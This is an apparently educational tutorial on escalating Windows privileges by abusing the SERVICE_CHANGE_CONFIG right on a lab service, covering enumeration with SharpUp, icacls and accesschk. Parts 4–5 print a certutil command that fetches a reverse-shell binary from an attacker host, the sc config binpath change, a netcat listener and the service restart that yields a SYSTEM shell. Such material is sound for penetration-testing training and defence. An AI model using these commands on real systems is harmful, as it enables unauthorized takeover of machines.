### **[Part 1: Introduction to Insecure Service Configurations (`SERVICE_CHANGE_CONFIG` vs. Insecure Executable)]**

In the previous method, we checked permissions on the service binary path executable itself and replaced the executable file. Now, let me explain a second type of service misconfiguration: modifying the service configuration itself.

Sometimes, you do not have permission to modify, overwrite, or replace the service executable binary located at `BINARY_PATH_NAME`—you have no write or modify access to the `.exe` file. However, you might still possess permission to modify the **service configuration** parameters. As the concept states: _"Sometimes the misconfiguration is not on the service executable, but on the service configuration."_

Instead of replacing the original executable file, you modify the `BINARY_PATH_NAME` value directly inside the service configuration, redirecting the service execution path to point to a custom malicious executable payload. To modify a service's configuration, your user account or group requires the **`SERVICE_CHANGE_CONFIG`** permission on that service object.

---

### **[Part 2: Service Enumeration using SharpUp & Checking Executable Permissions]**

To check service configuration permissions, you can use built-in Windows commands like `sc sdshow <service_name>`. However, `sc sdshow` outputs permissions in Security Descriptor Definition Language (SDDL) format, which consists of long, dense strings of characters that are difficult to read manually.

Alternatively, you can automate enumeration using tools like **PowerUp** or **SharpUp** (`SharpUp.exe`). _(Note: Remember that command prompt syntax on Windows CMD uses backslashes `\` rather than forward slashes `/`)_.

Running `SharpUp.exe audit` checks for modifiable services and identifies a target service named **`daclsvc`** (DACL Service).

Inspecting the service configuration with `sc qc daclsvc` reveals:

- **`START_TYPE`**: `DEMAND_START`
- **`BINARY_PATH_NAME`**: `C:\Program Files\DACL Service\daclservice.exe`

Checking file permissions on the executable using `icacls "C:\Program Files\DACL Service\daclservice.exe"` displays:

- **`NT AUTHORITY\SYSTEM`**: Full Access (`F`)
- **`BUILTIN\Administrators`**: Full Access (`F`)
- **`BUILTIN\Users`**: Read and Execute (`RX`) only.

Since standard users only hold Read and Execute permissions (`RX`), we cannot overwrite or modify the binary executable directly.

---

### **[Part 3: Checking Service Object Permissions with Sysinternals AccessChk]**

While `icacls` checks permissions on files and directories, checking permissions assigned to Windows service objects requires Sysinternals **`accesschk.exe`**.

To audit permissions on a specific service object using `accesschk.exe`, use the `-c` switch:

```
accesschk.exe -c daclsvc -v
```

- **`-c`**: Specifies that the target object is a Windows service name.
- **`-v`**: Enables verbose output to show granular access rights per group.

Running this command lists permissions granted across user groups on the `daclsvc` service object. The output shows that **`Everyone`** possesses:

- `SERVICE_QUERY_STATUS`
- `SERVICE_QUERY_CONFIG`
- **`SERVICE_CHANGE_CONFIG`**

This represents a major security vulnerability! Even though the `Everyone` group has no write permissions on the underlying `.exe` file, granting `SERVICE_CHANGE_CONFIG` allows any standard user to alter the service's execution parameters.

---

### **[Part 4: Exploiting `SERVICE_CHANGE_CONFIG` via `sc config binpath=`]**

Because `daclsvc` executes under the **`LocalSystem`** context, changing its `BINARY_PATH_NAME` parameter forces the service to execute our custom payload with full **`NT AUTHORITY\SYSTEM`** privileges upon startup.

To reconfigure the service binary path, use the **`sc config`** command.

_(Critical Syntax Note: In `sc config` commands, there MUST be a space between `binpath=` and the opening quote of your binary path, e.g., `binpath= "..."`)_.

#### **Exploitation Steps:**

1. **Transfer Reverse Shell Payload**: Navigate to `C:\Temp` and download your reverse shell binary using `certutil`:
    
    ```
    certutil -urlcache -f http://<ATTACKER_IP>:8000/reverse.exe reverse.exe
    ```
    
2. **Reconfigure Service Binary Path**: Update `daclsvc` to point to `reverse.exe`:
    
    ```
    sc config daclsvc binpath= "C:\Temp\reverse.exe"
    ```
    
    Windows returns: `[SC] ChangeServiceConfig SUCCESS`.
    
3. **Verify Configuration Change**: Run `sc qc daclsvc` to confirm that `BINARY_PATH_NAME` now points directly to `C:\Temp\reverse.exe`.
    

---

### **[Part 5: Executing Payload & Achieving `NT AUTHORITY\SYSTEM` Access]**

1. Start a Netcat listener on your attacking host (`nc -lvnp 4444`).
2. Start the reconfigured service:
    
    ```
    net start daclsvc
    ```
    

When the service starts, Windows executes `C:\Temp\reverse.exe` under the `LocalSystem` account context, triggering a reverse connection back to your Netcat listener and granting an interactive **`NT AUTHORITY\SYSTEM`** shell!

---

### **[Part 6: Conclusion & Summary of Service Misconfigurations]**

To summarize, Windows service privilege escalation primarily relies on two major misconfiguration types:

1. **Insecure Service Executables**: Modifying or overwriting the service `.exe` binary directly when file permissions (`Everyone:(F)` / `Everyone:(M)`) permit.
2. **Insecure Service Permissions**: Modifying the service binary path (`binpath=`) via `sc config` when `SERVICE_CHANGE_CONFIG` is granted on the service object.

Both misconfiguration types frequently appear in penetration testing assessments and CTF challenges. Practice auditing service permissions across lab targets, keep detailed notes, and review documentation to reinforce these concepts.
